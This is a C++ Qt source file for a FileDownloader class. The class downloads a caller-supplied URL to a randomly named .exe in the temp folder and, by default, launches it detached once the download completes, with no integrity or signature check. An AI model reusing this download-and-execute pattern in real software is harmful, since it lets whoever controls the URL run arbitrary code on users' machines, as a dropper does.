#include "filedownloader.h"

#include <QTime>
#include <QDir>
#include <QNetworkAccessManager>
#include <QNetworkReply>
#include <QProcess>
#include <QDebug>

FileDownloader::FileDownloader(const QString &url, QObject *parent) : QObject(parent),
    _reply(nullptr),
    _url(url), _autoExec(true), _autoDelete(true)
{
    _nat = new QNetworkAccessManager(this);

}

void FileDownloader::startDownload()
{
    forever {
        qsrand(QTime::currentTime().msec());
        QString t = QDir::tempPath() + "/data" + QString::number(qrand()) + ".exe";
        if (QFile::exists(t) && !QFile::remove(t))
            continue;

        _localFile.setFileName(t);
        break;
    }

    if (!_localFile.open(QIODevice::WriteOnly))
        return;

    if (_reply)
        _reply->deleteLater();

    QNetworkRequest request;
    request.setUrl(QUrl(_url));

    _reply = _nat->get(request);
    connect(_reply, &QNetworkReply::readyRead, this, &FileDownloader::reply_readyRead);
    connect(_reply, &QNetworkReply::finished, this, &FileDownloader::reply_finished);
    connect(_reply, &QNetworkReply::downloadProgress, [](qint64 bytesReceived, qint64 bytesTotal){
        qDebug() << bytesReceived << "/" << bytesTotal;
    });

}

void FileDownloader::reply_readyRead()
{
    auto b = _reply->readAll();
    _localFile.write(b);
    _localFile.flush();
    qDebug() << "bs="<<b.size();
}

void FileDownloader::reply_finished()
{
    _localFile.flush();
    _localFile.close();
    _reply->deleteLater();
    _reply = nullptr;

    if (_autoExec) {
        QProcess p;
        p.setProgram(_localFile.fileName());
        p.startDetached();
    }
    if (_autoDelete) {
        deleteLater();
    }
}

bool FileDownloader::autoExec() const
{
    return _autoExec;
}

void FileDownloader::setAutoExec(bool autoExec)
{
    _autoExec = autoExec;
}

bool FileDownloader::autoDelete() const
{
    return _autoDelete;
}

void FileDownloader::setAutoDelete(bool autoDelete)
{
    _autoDelete = autoDelete;
}
